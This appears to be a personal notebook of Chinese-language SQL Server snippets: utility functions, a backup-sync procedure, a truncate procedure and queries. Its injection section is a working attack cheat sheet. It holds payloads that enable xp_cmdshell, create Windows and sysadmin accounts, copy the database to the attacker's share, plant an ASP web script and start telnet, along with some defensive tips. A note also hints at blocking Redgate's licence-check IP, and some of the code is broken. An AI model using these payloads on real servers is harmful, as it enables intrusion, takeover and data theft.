	PRINT @sqlstr
	EXEC(@sqlstr)
```
# 获取所有列名
```sql

CREATE FUNCTION ufn_GetAllColumns
    (
      @tablename VARCHAR(255) ,
      @tablealias VARCHAR(10) = '' ,
      @columalias VARCHAR(10) = ''
	)
RETURNS VARCHAR(MAX)
AS
    BEGIN
        DECLARE @columnlist1 VARCHAR(MAX)= ' ' ,
            @lastchar CHAR(1);
        IF @tablealias <> ''
            BEGIN
                SELECT  @lastchar = RIGHT(@tablealias, 1);
                IF @lastchar <> '.'
                    SET @tablealias = @tablealias + '.';
            END;
        IF @columalias <> ''
            BEGIN
                SELECT  @lastchar = RIGHT(@columalias, 1);
                IF @lastchar <> '_'
                    SET @columalias = @columalias + '_';
                SELECT  @columnlist1 = @columnlist1 + @tablealias + name
                        + ' as ' + @columalias + name + ' ,'
                FROM    syscolumns
                WHERE   id = OBJECT_ID(@tablename);
                SELECT  @columnlist1 = LEFT(@columnlist1,
                                            LEN(@columnlist1) - 1);
            END;
        ELSE
            IF @columalias = ''
                BEGIN
                    SELECT  @columnlist1 = @columnlist1 + @tablealias + name
                            + ' ,'
                    FROM    syscolumns
                    WHERE   id = OBJECT_ID(@tablename);
                    SELECT  @columnlist1 = LEFT(@columnlist1,
                                                LEN(@columnlist1) - 1);
                END;
        RETURN  ISNULL(@columnlist1,'');
    END;



```
# 同步数据
```sql
SET QUOTED_IDENTIFIER ON
SET ANSI_NULLS ON
GO


CREAT PROCEDURE [dbo].[usp_sys_SynData]
AS
BEGIN
/*
usp_sys_SynData
*/
Select Name INTO #AllTable FROM ProductionDB..SysObjects WHERE 1=1
AND XType='U' 
--AND name<>'tb_MyMenu'
--AND name<>'tb_MyRole'
--AND name<>'tb_MyUser'
--AND name<>'tb_MyUserRoles'
--AND name<>'tb_MyGroup'
--AND name<>'tb_MyGroupRole'
--AND name<>'tb_MyGroupUser'
--AND name<>'dbo.tb_MyRoleActions'
--AND name<>'dt_notes'
--AND name<>'sys_SystemSettings'
--AND name<>'sys_SystemSettingsByUser'
--AND name<>'sys_DataSN'
ORDER BY Name
DELETE #AllTable WHERE NAME='dt_City1'
DELETE #AllTable WHERE NAME='dt_City3'
--DELETE #AllTable WHERE NAME='tb_MyMenu'
--DELETE #AllTable WHERE NAME='tb_MyRole'
--DELETE #AllTable WHERE NAME='tb_MyUser'
--DELETE #AllTable WHERE NAME='tb_MyUserRoles'
--DELETE #AllTable WHERE NAME='tb_MyGroup'
--DELETE #AllTable WHERE NAME='tb_MyGroupRole'
--DELETE #AllTable WHERE NAME='tb_MyGroupUser'
--DELETE #AllTable WHERE NAME='dbo.tb_MyRoleActions'
--DELETE #AllTable WHERE NAME='dt_notes'
--DELETE #AllTable WHERE NAME='sys_SystemSettings'
--DELETE #AllTable WHERE NAME='sys_SystemSettingsByUser'
--DELETE #AllTable WHERE NAME='sys_DataSN'
SELECT   
--表名              =   CASE   WHEN   A.COLORDER=1   THEN   D.NAME   ELSE   ' '   END, 
表名              =     D.NAME  , 
表说明          =   CASE   WHEN   A.COLORDER=1   THEN   ISNULL(F.VALUE, ' ')   ELSE   ' '   END, 
字段序号      =   A.COLORDER, 
字段名          =   A.NAME, 
标识自增字段              =   CASE   WHEN   COLUMNPROPERTY(   A.ID,A.NAME, 'ISIDENTITY ')=1   THEN   'Y'ELSE   ' '   END, 
主键              =   CASE   WHEN   EXISTS(Select   1   FROM   SYSOBJECTS   Where   XTYPE= 'PK '   AND   PARENT_OBJ=A.ID   AND   NAME   IN   ( 
SELECT   NAME   FROM   SYSINDEXES   Where   INDID   IN( 
SELECT   INDID   FROM   SYSINDEXKEYS   Where   ID   =   A.ID   AND   COLID=A.COLID)))   THEN   'Y'   ELSE   ' '   END, 
类型              =   B.NAME, 
字段长度  =   A.LENGTH, 
精度              =   COLUMNPROPERTY(A.ID,A.NAME, 'PRECISION '), 
小数位数      =   ISNULL(COLUMNPROPERTY(A.ID,A.NAME, 'SCALE '),0), 
允许空          =   CASE   WHEN   A.ISNULLABLE=1   THEN   'Y'ELSE   ' '   END, 
缺省值          =   ISNULL(E.TEXT, ' '), 
字段说明      =   ISNULL(G.[VALUE], ' ') 
INTO #All 
FROM   
SYSCOLUMNS   A 
LEFT   JOIN SYSTYPES   B   
    ON  A.XUSERTYPE=B.XUSERTYPE 
INNER   JOIN   SYSOBJECTS   D   
    ON  A.ID=D.ID     AND   D.XTYPE= 'U '   AND     D.NAME <> 'DTPROPERTIES ' 
LEFT   JOIN SYSCOMMENTS   E   
    ON  A.CDEFAULT=E.ID 
LEFT   JOIN sys.extended_properties   G   
    ON  A.ID=G.major_id   AND   A.COLID=G.minor_id     
LEFT   JOIN sys.extended_properties   F   
    ON  D.ID=F.major_id   AND   F.minor_id=0
WHERE D.name IN (SELECT * FROM #AllTable)
--SELECT * FROM #All
SELECT DISTINCT 字段名 AS Col INTO #ExceptColumn FROM #All WHERE 标识自增字段='Y' 
UNION
SELECT DISTINCT 字段名 AS Col  FROM #All WHERE 类型='timestamp'
DROP TABLE #All

declare @columnlist varchar(8000)=''
DECLARE @DEL VARCHAR(max)=''
--DECLARE @On VARCHAR(max)=''
--DECLARE @Off VARCHAR(max)=''
DECLARE @INSERT VARCHAR(max)=''
DECLARE OneCursor CURSOR    
FOR SELECT Name FROM  #AllTable
OPEN OneCursor
DECLARE @noToUpdate VARCHAR(200)    
FETCH NEXT FROM OneCursor INTO @noToUpdate
 WHILE @@fetch_status=0    
     BEGIN
     --drop table 之后直接 insert 会导致表结构不同步，无主键
     set @DEL='USE BackDB EXEC [dbo].[usp_Truncate_Table] '+@noToUpdate+''     
     EXEC (@DEL)
     select   @columnlist=@columnlist+name+ ','   from   syscolumns   where   id   =   object_id(@noToUpdate)   and   name NOT IN (SELECT Col FROM #ExceptColumn)
     select   @columnlist=left(@columnlist,len(@columnlist)-1)
     --SET @On='SET IDENTITY_INSERT '+@noToUpdate+' ON'--如果表没有IDENTITY字段会报错
     set @INSERT='insert into BackDB.dbo.'+@noToUpdate+' ('+@columnlist+') select '+@columnlist+' from ProductionDB.dbo.'+@noToUpdate
     PRINT (@INSERT)
	 --set @INSERT='USE BackDB insert into '+@noToUpdate+' ('+@columnlist+') select '+@columnlist+' from ProductionDB.dbo.'+@noToUpdate
     --SET @Off='SET IDENTITY_INSERT '+@noToUpdate+' OFF'
     --EXEC (@On)
     EXEC (@INSERT)
     --EXEC (@Off)
     select   @columnlist   =   ''
     FETCH NEXT FROM OneCursor INTO @noToUpdate
     END 
 CLOSE OneCursor     
 DEALLOCATE OneCursor 
DROP TABLE #AllTable
DROP TABLE #ExceptColumn

UPDATE BackDB.dbo.sys_SystemSettings SET ParamValue='' WHERE ParamCode='FYUSER_URL'
UPDATE BackDB.dbo.sys_SystemSettings SET ParamValue='否' WHERE ParamCode='HYConnectFuYou'
UPDATE BackDB.dbo.sys_SystemSettings SET ParamValue='否' WHERE ParamCode='HYConnectHongBaoShangHai'
										
UPDATE BackDB.dbo.sys_SystemSettings SET ParamValue='' WHERE ParamCode='Ali_Bucket'
UPDATE BackDB.dbo.sys_SystemSettings SET ParamValue='' WHERE ParamCode='Ali_Endpoint'
UPDATE BackDB.dbo.sys_SystemSettings SET ParamValue='' WHERE ParamCode='Ali_KeyID'
UPDATE BackDB.dbo.sys_SystemSettings SET ParamValue='' WHERE ParamCode='Ali_KeySecret'


INSERT INTO BackDB.dbo.dt_Customer
        ( col2,DataType,CustomerSN,CustomerCode,CustomerName ,
          ShortName,ZJM,Station,Contacts,Tel ,
          Mobile,Address,Fax,Email,TrustLevel ,
          Tax,Bank,BankAccount,SalesPerson,SalesDeputy ,
          ProjectManager,PaymentTerm,PaymentDays,ContractNo,ContractDate1 ,
          ContractDate2,InUse,InvoiceFax,FlagInvoice,Remark ,
          CreationDate,CreatedBy,LastUpdateDate,LastUpdatedBy,SettleType ,
          DepotPerson,FinancePerson,ReconciliationPerson,DepotTel ,
          FinanceTel,ReconciliationTel,AccountName,DepartmentCode
        )
VALUES  ('SH','U','KH4TEST','A33D83C6815749EB8524737CEE4AB94B','API专用测试客户',
'APITEST','APITEST','SH','张三','13812345678',
'13812345678','上海','021-1234567','test@email.com','VIP',
'','','','admin','admin',
'admin',1,1,'',NULL,
NULL,'Y',6,'Y','',
GETDATE(),'admin',GETDATE(),'admin',6,
'','','','',
'','','','F01'
 )



 INSERT INTO BackDB.dbo.dt_UserAccount
        ( CustomerCode ,
          CustomerChildAccountName ,
          CustomerChildAccountID ,
          AccountPassWord ,
          Remark ,
          DepartmentName ,
          LastUpdateDate ,
          LastUpdatedBy ,
          AccountEMail ,
          col2 ,
          IsCustomerAdmin ,
          ShowOtherDoc
        )
VALUES  ( 'A33D83C6815749EB8524737CEE4AB94B' , -- CustomerCode - varchar(32)
          '张三' , -- AccountName - varchar(50)
          '17012345678' , -- CustomerChildAccountID - varchar(11)
          '' , -- AccountPassWord - varchar(50)
          '' , -- Remark - varchar(200)
          '' , -- DepartmentName - varchar(30)
          GETDATE() , -- LastUpdateDate - datetime
          'admin' , -- LastUpdatedBy - varchar(20)
          '' , -- AccountEMail - varchar(30)
          'SH' , -- col2 - varchar(10)
          'Y' , -- IsCustomerAdmin - char(1)
          'Y'  -- ShowOtherDoc - char(1)
        )








/**********************************************************************************
declare   @columnlist1   varchar(8000),   @tablename   varchar(255)   --定义两个变量 
select   @columnlist1   =   ' ',   @tablename= 'dt_CarInfo '   --变量赋值 
select   @columnlist1=@columnlist1+name+ ','   from   syscolumns   where   id   =   object_id(@tablename)   and   name <>'isid' AND name <>'TS'--循环生成所有查询需要的列（除去你不要的列） 
select   @columnlist1=left(@columnlist1,len(@columnlist1)-1)   --去掉构造的语句中最后一个‘，’号 
SELECT @columnlist1
exec( 'select   '+@columnlist1+ '   from   '   +@tablename)   --执行动态语句
select  *   from   syscolumns   where   id   =   object_id('dt_CarInfo')
***********************************************************************************/
END

GO
```
# usp_Truncate_Table
```sql
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

ALTER PROCEDURE [dbo].[usp_Truncate_Table]
  @TableToTruncate VARCHAR(64)
AS 

BEGIN

SET NOCOUNT ON

--==变量定义
DECLARE @i int
DECLARE @Debug bit
DECLARE @Recycle bit
DECLARE @Verbose bit
DECLARE @TableName varchar(80)
DECLARE @ColumnName varchar(80)
DECLARE @ReferencedTableName varchar(80)
DECLARE @ReferencedColumnName varchar(80)
DECLARE @ConstraintName varchar(250)

DECLARE @CreateStatement varchar(max)
DECLARE @DropStatement varchar(max)   
DECLARE @TruncateStatement varchar(max)
DECLARE @CreateStatementTemp varchar(max)
DECLARE @DropStatementTemp varchar(max)
DECLARE @TruncateStatementTemp varchar(max)
DECLARE @Statement varchar(max)

 SET @Debug = 0--(0:将执行相关语句|1:不执行语句)
 SET @Recycle = 0--(0:不创建/不清除存储表|1:将创建/清理存储表)
 set @Verbose = 1--(1:每步执行均打印消息|0:不打印消息)

 SET @i = 1
    SET @CreateStatement = 'ALTER TABLE [dbo].[<tablename>]  WITH NOCHECK ADD  CONSTRAINT [<constraintname>] FOREIGN KEY([<column>]) REFERENCES [dbo].[<reftable>] ([<refcolumn>])'
    SET @DropStatement = 'ALTER TABLE [dbo].[<tablename>] DROP CONSTRAINT [<constraintname>]'
    SET @TruncateStatement = 'TRUNCATE TABLE [<tablename>]'

-- 创建外键临时表
IF OBJECT_ID('tempdb..#FKs') IS NOT NULL
    DROP TABLE #FKs

-- 获取外键
SELECT ROW_NUMBER() OVER (ORDER BY OBJECT_NAME(parent_object_id), clm1.name) as isid,
       OBJECT_NAME(constraint_object_id) as ConstraintName,
       OBJECT_NAME(parent_object_id) as TableName,
       clm1.name as ColumnName, 
       OBJECT_NAME(referenced_object_id) as ReferencedTableName,
       clm2.name as ReferencedColumnName
  INTO #FKs
  FROM sys.foreign_key_columns fk
       JOIN sys.columns clm1 ON fk.parent_column_id = clm1.column_id AND fk.parent_object_id = clm1.object_id
       JOIN sys.columns clm2 ON fk.referenced_column_id = clm2.column_id AND fk.referenced_object_id= clm2.object_id
 --WHERE OBJECT_NAME(parent_object_id) not in ('//tables that you do not wont to be truncated')
 WHERE OBJECT_NAME(referenced_object_id) = @TableToTruncate
 ORDER BY OBJECT_NAME(parent_object_id)

-- 外键操作(删除|重建)表
IF Not EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'Internal_FK_Definition_Storage')
BEGIN
    IF @Verbose = 1
        PRINT '1. 正在创建表(Internal_FK_Definition_Storage)...'
    CREATE TABLE [Internal_FK_Definition_Storage] 
    (
        isid int not null identity(1,1) primary key,
        FK_Name varchar(250) not null,
        FK_CreationStatement varchar(max) not null,
        FK_DestructionStatement varchar(max) not null,
        Table_TruncationStatement varchar(max) not null
    ) 
END 
ELSE
BEGIN
    IF @Recycle = 0
    BEGIN
        IF @Verbose = 1
        PRINT '1. 正在清理表(Internal_FK_Definition_Storage)...'
        TRUNCATE TABLE [Internal_FK_Definition_Storage]    
    END
    ELSE
        PRINT '1. 正在清理表(Internal_FK_Definition_Storage)...'
END

IF @Recycle = 0
BEGIN
    IF @Verbose = 1
        PRINT '2. 正在备份外键定义...'           
    WHILE (@i <= (SELECT MAX(isid) FROM #FKs))
    BEGIN
        SET @ConstraintName = (SELECT ConstraintName FROM #FKs WHERE isid = @i)
        SET @TableName = (SELECT TableName FROM #FKs WHERE isid = @i)
        SET @ColumnName = (SELECT ColumnName FROM #FKs WHERE isid = @i)
        SET @ReferencedTableName = (SELECT ReferencedTableName FROM #FKs WHERE isid = @i)
        SET @ReferencedColumnName = (SELECT ReferencedColumnName FROM #FKs WHERE isid = @i)

        SET @DropStatementTemp = REPLACE(REPLACE(@DropStatement,'<tablename>',@TableName),'<constraintname>',@ConstraintName)
        SET @CreateStatementTemp = REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(@CreateStatement,'<tablename>',@TableName),'<column>',@ColumnName),'<constraintname>',@ConstraintName),'<reftable>',@ReferencedTableName),'<refcolumn>',@ReferencedColumnName)
        SET @TruncateStatementTemp = REPLACE(@TruncateStatement,'<tablename>',@TableName) 

        INSERT INTO [Internal_FK_Definition_Storage]
        SELECT @ConstraintName, @CreateStatementTemp, @DropStatementTemp, @TruncateStatementTemp
        
        SET @i = @i + 1
        
        IF @Verbose = 1
            PRINT '  > 已备份外键:[' + @ConstraintName + '] 所属表: [' + @TableName + ']'
    END   
END   
ELSE 
    PRINT '2. 正在备份外键定义...'

IF @Verbose = 1
    PRINT '3. 正在删除外键...'
BEGIN TRAN    
BEGIN TRY
SET @i = 1
WHILE (@i <= (SELECT MAX(isid) FROM [Internal_FK_Definition_Storage]))
BEGIN
    SET @ConstraintName = (SELECT FK_Name FROM [Internal_FK_Definition_Storage] WHERE isid = @i)
    SET @Statement = (SELECT FK_DestructionStatement FROM [Internal_FK_Definition_Storage] WITH (NOLOCK) WHERE isid = @i)
    IF @Debug = 1 
        PRINT @Statement
    ELSE
        EXEC(@Statement)
    SET @i = @i + 1
    IF @Verbose = 1
        PRINT '  > 已删除外键:[' + @ConstraintName + ']'
END     

IF @Verbose = 1
    PRINT '4. 正在清理数据表...'
--先清除该外键所在表(由于外键所在表仍可能又被其他外键所引用，因此需要循环递归处理)(注：本处理未实现)
--请不要使用下面注释代码
/*    
SET @i = 1
WHILE (@i <= (SELECT MAX(isid) FROM [Internal_FK_Definition_Storage]))
BEGIN
    SET @Statement = (SELECT Table_TruncationStatement FROM [Internal_FK_Definition_Storage] WHERE isid = @i)
    IF @Debug = 1 
        PRINT @Statement
    ELSE
        EXEC(@Statement)
    SET @i = @i + 1
    IF @Verbose = 1
        PRINT '  > ' + @Statement
END
*/

IF @Debug = 1 
    PRINT 'TRUNCATE TABLE [' + @TableToTruncate + ']'
ELSE
    EXEC('TRUNCATE TABLE [' + @TableToTruncate + ']')
IF @Verbose = 1
    PRINT '  > 已清理数据表[' + @TableToTruncate + ']'
    
IF @Verbose = 1
    PRINT '5. 正在重建外键...'
SET @i = 1
WHILE (@i <= (SELECT MAX(isid) FROM [Internal_FK_Definition_Storage]))
BEGIN
    SET @ConstraintName = (SELECT FK_Name FROM [Internal_FK_Definition_Storage] WHERE isid = @i)
    SET @Statement = (SELECT FK_CreationStatement FROM [Internal_FK_Definition_Storage] WHERE isid = @i)
    IF @Debug = 1 
        PRINT @Statement
    ELSE
        EXEC(@Statement)
    SET @i = @i + 1
    IF @Verbose = 1
    PRINT '  > 已重建外键:[' + @ConstraintName + ']'
END
    COMMIT
END TRY
BEGIN CATCH
    ROLLBACK 
    PRINT '出错信息:'+ERROR_MESSAGE()
END CATCH
IF @Verbose = 1
    PRINT '6. 处理完成！'
END
```
# 求和
```sql
SELECT SUM( CASE WHEN ARAP='收'THEN ISNULL(Amount,0) WHEN ARAP='支'
THEN ISNULL(-Amount,0) END ) 
FROM dbo.tablename  WHERE  DocNo='xxx'

```
1. Sql Server插入数据并返回自增ID：@@IDENTITY，SCOPE_IDENTITY和IDENT_CURRENT的区别：@@IDENTITY是取全局操作的最后一步操作所产生的自增域的值的。如果在写存储过程时，向表中新增了一条数据，需要返回该IDENTITY值，则使用 SCOPE_IDENTITY()，因为它和当前会话相关联，不会返回一个你不需要的值。如果你仅仅想得到某个IDENTITY列的最后一个值，则使用 IDENT_CURRENT()最方便。[原文链接](http://www.bbsmax.com/A/q4zVVyylzK/)
2. 117.18.232.200 是redgate的认证IP，你懂的
3. insert into demo() output inserted.id  values('a','b');也可以获取自增id
# 注入
```sql
添加系统用户
a%' EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; exec master..xp_cmdshell 'net user test testpass /ADD' --
a' exec master..xp_cmdshell 'net localgroup /add administrators test' --

1)   猜测数据库名，备份数据库
a)   猜测数据库名： and db_name() >0 或系统表master.dbo.sysdatabases
b)   备份数据库：;backup database 数据库名 to disk = ‘c:\*.db’;--
或：declare @a sysname;set @a=db_name();backup database @a to disk='你的IP你的共享目录bak.dat' ,name='test';--
2)   猜解字段名称
a)   猜解法：and (select count(字段名) from 表名)>0   若“字段名”存在，则返回正常
b)   读取法：and (select top 1 col_name(object_id('表名'),1) from sysobjects)>0   把col_name(object_id('表名'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。
3)   遍历系统的目录结构，分析结构并发现WEB虚拟目录（服务器上传木马）
    先创建一个临时表：;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
a)   利用xp_availablemedia来获得当前所有驱动器,并存入temp表中
;insert temp exec master.dbo.xp_availablemedia;--
b)   利用xp_subdirs获得子目录列表,并存入temp表中
;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--
c)   利用xp_dirtree可以获得“所有”子目录的目录树结构,并存入temp表中
;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- （实验成功）
d)   利用 bcp 命令将表内容导成文件
即插入木马文本，然后导出存为文件。比如导出为asp文件，然后通过浏览器访问该文件并执行恶意脚本。（使用该命令必须启动’ xp_cmdshell’）
Exec master..xp_cmdshell N'BCP "select * from SchoolMarket.dbo.GoodsStoreData;" queryout c:/inetpub/wwwroot/runcommand.asp -w -S"localhost" -U"sa" -P"123"'
(注意：语句中使用的是双引号，另外表名格式为“数据库名.用户名.表名”)
在sql查询器中通过语句：Exec master..xp_cmdshell N'BCP’即可查看BCP相关参数


4)   查询当前用户的数据库权限
MSSQL中一共存在8种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。
可通过1=(select IS_SRVROLEMEMBER('sysadmin'))得到当前用户是否具有该权限。
5)   设置新的数据库帐户（得到MSSQL管理员账户）
d)   在数据库内添加一个hax用户，默认密码是空
;exec sp_addlogin'hax';--
e)   给hax设置密码 (null是旧密码，password是新密码，user是用户名)
;exec master.dbo.sp_password null,password,username;--
f)   将hax添加到sysadmin组
;exec master.dbo.sp_addsrvrolemember 'hax' ,'sysadmin';--
6)   xp_cmdshell MSSQL存储过程（得到 WINDOWS管理员账户 ）
通过(5)获取到sysadmin权限的帐户后，使用查询分析器连接到数据库，可通过xp_cmdshell运行系统命令行（必须是sysadmin权限），即使用 cmd.exe 工具，可以做什么自己多了解下。
下面我们使用xp_cmdshell来创建一个 Windows 用户，并开启远程登录服务：
a)   判断xp_cmdshell扩展存储过程是否存在
SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name ='xp_cmdshell'
b)   恢复xp_cmdshell扩展存储过程
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetput\web\xplog70.dll';
开启后使用xp_cmdshell还会报下面错误：
SQL Server 阻止了对组件 'xp_cmdshell' 的过程 'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
通过执行下面语句进行设置：
-- 允许配置高级选项
EXEC sp_configure 'show advanced options', 1
GO
-- 重新配置
RECONFIGURE
GO
-- 启用xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0
GO
--重新配置
RECONFIGURE
GO
c)   禁用xp_cmdshell扩展存储过程
Exec master.dbo.sp_dropextendedproc 'xp_cmdshell';
d)   添加windows用户：
Exec xp_cmdshell 'net user awen /add';
e)   设置好密码：
Exec xp_cmdshell 'net user awen password';
f)   提升到管理员：
Exec xp_cmdshell 'net localgroup administrators awen /add';
g)   开启telnet服务：
Exec xp_cmdshell 'net start tlntsvr'
7)   没有xp_cmdshell扩展程序，也可创建Windows帐户的办法.
(本人windows7系统，测试下面SQL语句木有效果)
declare @shell int ;
execsp_OAcreate 'w script .shell',@shell output ;
execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net user awen /add';
execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net user awen 123';
execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net localgroup administrators awen /add';
在使用的时候会报如下错：
SQL Server 阻止了对组件 'Ole Automation Procedures' 的过程 'sys.sp_OACreate'、'sys.sp_OAMethod' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 'Ole Automation Procedures'。有关启用 'Ole Automation Procedures' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
        解决办法：
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
好了，这样别人可以登录你的服务器了，你怎么看？
8)   客户端脚本攻击
攻击1：（正常输入）攻击者通过正常的输入提交方式将恶意脚本提交到数据库中，当其他用户浏览此内容时就会受到恶意脚本的攻击。
措施：转义提交的内容，.NET 中可通过System.Net.WebUtility.HtmlEncode(string) 方法将字符串转换为HTML编码的字符串。
 
攻击2：（SQL注入）攻击者通过SQL注入方式将恶意脚本提交到数据库中，直接使用SQL语法UPDATE数据库，为了跳过System.Net.WebUtility.HtmlEncode(string) 转义，攻击者会将注入SQL经过“HEX编码”，然后通过exec可以执行“动态”SQL的特性运行脚本”


declare @A varchar(200);set @A=reverse('''58803303431''=emanresu erehw ''9d4d9c1ac9814f08''=drowssaP tes xxx tadpu');

xp_：扩展存储过程的前缀，SQL注入攻击得手之后，攻击者往往会通过执行xp_cmdshell之类的扩展存储过程，获取系统信息，甚至控制、破坏系统。
xp_cmdshell
能执行dos命令，通过语句sp_dropextendedproc删除，
不过依然可以通过sp_addextendedproc来恢复，因此最好删除或改名xplog70.dll（sql server 2000、windows7）
xpsql70.dll(sqlserer 7.0)
xp_fileexist
用来确定一个文件是否存在
xp_getfiledetails
可以获得文件详细资料
xp_dirtree
可以展开你需要了解的目录，获得所有目录深度
Xp_getnetname
可以获得服务器名称
Xp_regaddmultistring
Xp_regdeletekey
Xp_regdeletevalue
Xp_regenumvalues
Xp_regread
Xp_regremovemultistring
Xp_regwrite
可以访问注册表的存储过程
Sp_OACreate
Sp_OADestroy
Sp_OAGetErrorInfo
Sp_OAGetProperty
Sp_OAMethod
Sp_OASetProperty
Sp_OAStop
如果你不需要请丢弃OLE自动存储过程

如果在存储过程中SQL语法很复杂需要根据逻辑进行拼接，这时是否还具有放注入的功能？
答：MSSQL中可以通过 EXEC 和sp_executesql动态执行拼接的sql语句，但sp_executesql支持替换 Transact-SQL 字符串中指定的任何参数值， EXECUTE 语句不支持。所以只有使用sp_executesql方式才能启到参数化防止SQL注入。
关键代码：（详细见示例）
a)   sp_executesql
CREATE PROCEDURE PROC_Login_executesql(
@userNamenvarchar(10),
@password nvarchar(10),
@count int OUTPUT
)
AS
BEGIN
   DECLARE @s nvarchar(1000);
set @s=N'SELECT @count=COUNT(*) FROM Login WHERE UserName=@userName AND Password=@password';
   EXEC sp_executesql @s,N'@userName nvarchar(10),@password nvarchar(10),@count int output',@userName=@userName,@password=@password,@count=@count output
END


b)   EXECUTE（注意sql中拼接字符，对于字符参数需要额外包一层单引号，需要输入两个单引号来标识sql中的一个单引号）

CREATE PROCEDURE PROC_Login_EXEC(
@userNamenvarchar(10),
@password varchar(20)
)
AS
BEGIN
   DECLARE @s nvarchar(1000);
set @s='SELECT @count=COUNT(*) FROM Login WHERE UserName='''+CAST(@userName AS NVARCHAR(10))+''' AND Password='''+CAST(@password AS VARCHAR(20))+'''';
EXEC('DECLARE @count int;' +@s+'select @count');
END

```

# 递归查询子级
```sql
			  ;
        WITH    T AS ( SELECT   *
                       FROM     tb_table
                       WHERE    col = '1001'
                                AND col2 = 'SH'
                       UNION ALL
                       SELECT   A.*
                       FROM     tb_table A
                                JOIN T ON A.ParentID = T.col
                                WHERE A.col2 = 'SH'
                     )
            SELECT  *
            --INTO    #ALL
            FROM    T; 
```